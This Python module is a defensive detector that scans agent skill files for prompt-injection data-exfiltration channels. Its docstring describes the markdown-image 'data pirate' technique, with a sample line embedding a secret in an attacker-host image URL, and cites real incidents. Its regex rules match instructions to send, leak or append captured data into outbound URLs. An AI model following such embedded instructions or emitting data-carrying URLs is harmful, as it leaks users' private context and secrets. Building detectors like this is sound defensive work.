"""Data-exfiltration channel detector (Markdown & HTML).

The single most-documented prompt-injection exfiltration channel is the
**markdown image / link data-pirate**: the agent is told to embed
`![x](https://attacker/?d=<secret>)` in its output, and the victim's
client silently fetches the URL — carrying stolen context out in the query
string. The HTML detector catches `fetch()`/beacons, but a plain `.md`
SKILL file using the markdown-image channel had no deterministic check.

This detector closes that gap with Layer 1 (confirmed) rules.

Maps to:
  - MITRE ATLAS  AML.T0025 (Exfiltration via Cyber Means),
                 AML.T0024 (Exfiltration via AI Inference API)
  - OWASP LLM02 (Sensitive Information Disclosure) / Agentic ASI03
  - NIST AI RMF MEASURE 2.7, MEASURE 2.10 (privacy)

Real-world grounding: ATLAS case studies AML.CS0020 (Bing Chat "Data
Pirate"), AML.CS0021 / AML.CS0029 (ChatGPT / Bard conversation exfil),
CVE-2025-32711 (EchoLeak), EmbraceTheRed Copilot Chat disclosure.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import List, Pattern

from scanner_core.helpers.models import HarmCategory, Layer1Finding, Severity


@dataclass(frozen=True)
class _Rule:
    type: str
    severity: Severity
    pattern: Pattern[str]
    action: str


def _re(s: str) -> Pattern[str]:
    return re.compile(s, re.IGNORECASE)


# Query-parameter names whose presence in an outbound URL signals that the
# agent is being asked to append captured data to the request.
_SENSITIVE_PARAM = (
    r"(data|d|q|query|prompt|context|secret|token|key|api[_-]?key|"
    r"content|summary|output|info|payload|conv|history|msg|message|"
    r"creds?|password|cookie|session)"
)

_RULES: List[_Rule] = [
    # Markdown image pointing at an external URL whose query carries data.
    _Rule("EXFIL_MARKDOWN_IMAGE", "HIGH",
          _re(r"!\[[^\]]*\]\(\s*https?://[^)\s]+[?&]" + _SENSITIVE_PARAM + r"=[^)]*\)"),
          "Remove markdown-image data-exfiltration channel (image URL carries data in its query string)"),
    # Markdown link with the same data-carrying query pattern.
    _Rule("EXFIL_MARKDOWN_LINK", "HIGH",
          _re(r"(?<!!)\[[^\]]*\]\(\s*https?://[^)\s]+[?&]" + _SENSITIVE_PARAM + r"=[^)]*\)"),
          "Remove markdown-link data-exfiltration channel (link URL carries data in its query string)"),
    # Imperative instruction to send/post/upload data to an external endpoint.
    _Rule("EXFIL_OUTBOUND_SEND", "HIGH",
          _re(r"\b(send|post|upload|exfiltrate|transmit|beacon|leak|forward|"
              r"report\s+back)\b.{0,50}\b(to\s+)?https?://"),
          "Remove instruction to transmit data to an external endpoint"),
    # Instruction to embed/append captured content into an outbound URL.
    _Rule("EXFIL_URL_ASSEMBLY", "MEDIUM",
          _re(r"\b(append|add|include|put|encode|embed)\b.{0,40}"
              r"\b(into|in|to)\b.{0,15}\b(the\s+)?(url|link|image|query\s*string|endpoint|request)\b"),
          "Audit directive that assembles captured data into an outbound URL"),
]


def detect(text: str) -> List[Layer1Finding]:
    findings: List[Layer1Finding] = []
    if not text:
        return findings

    seen_types: set[str] = set()
    for rule in _RULES:
        if rule.type in seen_types:
            continue
        m = rule.pattern.search(text)
        if not m:
            continue
        seen_types.add(rule.type)
        line = text.count("\n", 0, m.start()) + 1
        snippet_start = max(0, m.start() - 10)
        snippet_end = min(len(text), m.end() + 10)
        findings.append(Layer1Finding(
            detector="exfiltration_detector",
            type=rule.type,
            owasp_id="LLM02",
            severity=rule.severity,
            line=line,
            matched_snippet=text[snippet_start:snippet_end].strip()[:160],
            harm_category="EXFILTRATION",
            recommended_action=rule.action,
        ))

    return findings
